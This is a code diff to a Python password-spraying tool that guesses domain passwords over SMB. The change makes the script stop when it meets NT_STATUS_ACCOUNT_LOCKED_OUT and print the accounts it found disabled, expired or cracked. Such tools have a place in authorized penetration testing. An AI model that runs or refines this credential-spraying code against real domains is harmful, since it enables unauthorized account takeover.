@@ -62,6 +62,14 @@ def sprayer(domain, user_list, password_list, target_ip, output):
             elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
                 print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                 temp_users.remove(user)
+            # check to see if the account has been locked out, if so, stop spraying to not lock out the whole domain
+            elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
+                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
+                user_diff = set(user_list_clean) - set(temp_users)
+                print('Stopping script due to account lockout')
+                print('The following accounts are expired, disabled or cracked:')
+                print(user_diff)
+                quit()
             # if logon fails, drop the response, any other response, print to screen and remove account from spraying
             elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
                 print("The account %s was successfully logged into using the password %s" % (user, password))
